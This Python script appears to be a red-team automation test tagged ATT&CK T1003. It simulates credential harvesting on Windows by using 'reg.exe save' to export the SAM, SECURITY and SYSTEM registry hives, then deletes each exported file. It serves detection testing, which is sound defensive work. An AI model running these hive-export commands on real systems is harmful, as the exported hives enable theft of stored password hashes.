"""
Name: Export Registry Hives
RTA: registry_hive_export.py
ATT&CK: T1003
Description:
The registry_hive_export.py script simulates exporting the SAM, SECURITY, and SYSTEM registry hives using `reg.exe`.
This technique is commonly used in credential harvesting and discovery attacks.
Key Features:
- Registry Hive Export: Exports the SAM, SECURITY, and SYSTEM registry hives using the `reg.exe` tool.
- Simulates Credential Harvesting: The exported registry hives can be used for credential extraction in attacks.
- Windows-Specific: Since it relies on the Windows registry and `reg.exe`, this script should only run on Windows systems.
"""

import os
import platform
import common

REG = "reg.exe"


def main():
    # Ensure script only runs on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    for hive in ["sam", "security", "system"]:
        filename = os.path.abspath("%s.reg" % hive)
        common.log("Exporting %s hive to %s" % (hive, filename))
        common.execute([REG, "save", "hkey_local_machine\\%s" % hive, filename])
        common.remove_file(filename)

        common.execute([REG, "save", "hklm\\%s" % hive, filename])
        common.remove_file(filename)


if __name__ == "__main__":
    exit(main())
